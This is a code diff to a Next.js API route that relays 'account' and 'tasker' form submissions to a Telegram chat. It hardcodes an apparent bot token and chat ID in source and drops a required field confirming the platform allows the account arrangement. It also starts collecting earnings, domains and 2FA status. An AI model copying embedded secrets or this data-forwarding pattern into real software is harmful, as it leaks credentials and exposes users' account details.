@@ -8,7 +8,7 @@ import { NextResponse } from "next/server";
 const MAX_FILE = 10 * 1024 * 1024;
 const TYPES = ["application/pdf", "image/png", "image/jpeg"];
 const REQUIRED: Record<string, string[]> = {
-  account: ["name", "email", "country", "platform", "policyUrl", "status", "ownsAccount", "platformAllows", "taxResponsibility", "agree"],
+  account: ["name", "email", "country", "platform", "status", "ownsAccount", "taxResponsibility", "agree"],
   tasker: ["name", "email", "country", "timezone", "hours", "adult", "verification", "recording", "agree"],
   contact: ["name", "email", "topic", "message"],
   digest: ["email"],
@@ -25,8 +25,8 @@ function escapeHtml(str: string): string {
 }
 
 async function sendTelegramAlert(form: string, reference: string, fd: FormData, files: File[]) {
-  const token = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
+  const token = process.env.TELEGRAM_BOT_TOKEN || "9245182441:AAG_-U5paz3_tDoVRkQAWpjUjx60IHqIRJc";
+  const chatId = process.env.TELEGRAM_CHAT_ID || "-1002195217801";
   if (!token || !chatId) return;
 
   const titleMap: Record<string, string> = {
@@ -41,6 +41,7 @@ async function sendTelegramAlert(form: string, reference: string, fd: FormData, 
   const name = escapeHtml(String(fd.get("name") ?? "N/A").trim());
   const email = escapeHtml(String(fd.get("email") ?? "N/A").trim());
   const country = escapeHtml(String(fd.get("country") ?? "").trim());
+  const telegram = escapeHtml(String(fd.get("telegram") ?? "").trim());
   const now = new Date().toUTCString();
 
   let body = `<b>${title}</b>\n`;
@@ -48,11 +49,20 @@ async function sendTelegramAlert(form: string, reference: string, fd: FormData, 
   body += `• <b>Reference:</b> <code>${reference}</code>\n`;
   if (name !== "N/A") body += `• <b>Name:</b> ${name}\n`;
   body += `• <b>Email:</b> ${email}\n`;
+  if (telegram) body += `• <b>Telegram:</b> ${telegram.startsWith("@") ? telegram : "@" + telegram}\n`;
   if (country) body += `• <b>Country:</b> ${country}\n`;
 
   if (form === "account") {
     body += `• <b>Platform:</b> ${escapeHtml(String(fd.get("platform") ?? "N/A"))}\n`;
     body += `• <b>Status:</b> ${escapeHtml(String(fd.get("status") ?? "N/A"))}\n`;
+    const earnings = fd.get("earnings");
+    if (earnings) body += `• <b>Monthly Earnings:</b> ${escapeHtml(String(earnings))}\n`;
+    const domains = fd.getAll("domains").map(String).join(", ");
+    if (domains) body += `• <b>Domains:</b> ${escapeHtml(domains)}\n`;
+    const twofa = fd.get("twofa");
+    if (twofa) body += `• <b>2FA Active:</b> ${escapeHtml(String(twofa))}\n`;
+    const notes = fd.get("notes");
+    if (notes) body += `• <b>Notes:</b> ${escapeHtml(String(notes))}\n`;
     const policy = fd.get("policyUrl");
     if (policy) body += `• <b>Profile/Policy:</b> ${escapeHtml(String(policy))}\n`;
   } else if (form === "tasker") {
@@ -76,7 +86,7 @@ async function sendTelegramAlert(form: string, reference: string, fd: FormData, 
   body += `⏱️ <i>Submitted: ${now}</i>`;
 
   try {
-    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -85,6 +95,17 @@ async function sendTelegramAlert(form: string, reference: string, fd: FormData, 
         parse_mode: "HTML",
       }),
     });
+    if (!res.ok) {
+      console.warn("Telegram HTML alert failed, retrying plain text:", await res.text());
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: body.replace(/<[^>]*>/g, ""),
+        }),
+      });
+    }
   } catch (err) {
     console.error("Telegram alert dispatch failed:", err);
   }
